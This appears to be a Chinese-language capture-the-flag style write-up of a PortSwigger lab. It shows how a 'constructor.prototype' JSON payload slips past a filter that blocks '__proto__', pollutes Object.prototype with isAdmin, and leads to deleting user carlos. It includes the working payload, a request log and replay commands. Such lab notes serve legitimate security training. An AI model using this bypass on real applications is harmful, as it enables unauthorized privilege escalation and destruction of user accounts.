---
title: "lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution

> evidences: [[prototype-pollution-family]]

- 题面:Bypassing flawed input filters for server-side prototype pollution(/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution)
- 实例:https://0ab7006c04b8d754804c1c3b00de00f5.web-security-academy.net
- 判定目标:绕过输入过滤器污染 `Object.prototype`,提权访问 admin 并删 carlos

## 关键步

1. 同族 Node/Express 靶场,**JSON 请求体**;登录 `POST /login` body `{"csrf":…,"username":"wiener","password":"peter"}`。
2. 源:`POST /my-account/change-address`(JSON 合并)。过滤器拦 `__proto__` 键。
3. 绕过:改用 `constructor.prototype` 包裹:
   `"constructor":{"prototype":{"isAdmin":true}}`。
4. gadget:`isAdmin` → 响应体回 `"isAdmin":true`;随即 `GET /admin` 200(此前 401/403)。
5. 收尾:`GET /admin/delete?username=carlos` → 302 /admin。

## 交册值

`"constructor":{"prototype":{"isAdmin":true}}`(constructor.prototype 绕键名过滤 + isAdmin gadget)。

## 证据摘录

```
POST /my-account/change-address  {…,"constructor":{"prototype":{"isAdmin":true}}} -> 200 {"username":"wiener",…,"isAdmin":true}
GET  /admin -> 200(carlos 删除链接)
GET  /admin/delete?username=carlos -> 302 /admin
solved_check / -> {"solved":true}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution" --out /tmp/b6-2.html
lab_launch launch 5748A03C200EEC26FB8DD053F332832B59A5509CAD225088B2A093D71159FF85 --widget-source /web-security/prototype-pollution/server-side/lab-bypassing-flawed-input-filters-for-server-side-prototype-pollution --jar /tmp/mar-jar.json
lab_http post "<inst>/login" --header 'Content-Type: application/json' --body '{"csrf":"…","username":"wiener","password":"peter"}' --jar /tmp/mar-jar.json
lab_http post "<inst>/my-account/change-address" --header 'Content-Type: application/json' --body '{"address_line_1":"a","address_line_2":"b","city":"c","postcode":"d","country":"e","sessionId":"<sid>","constructor":{"prototype":{"isAdmin":true}}}' --jar /tmp/mar-jar.json
lab_http get  "<inst>/admin/delete?username=carlos" --jar /tmp/mar-jar.json --follow
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

要点:过滤只拦 `__proto__` 字面时,`constructor.prototype` 等价且绕过;isAdmin 是提权 gadget。
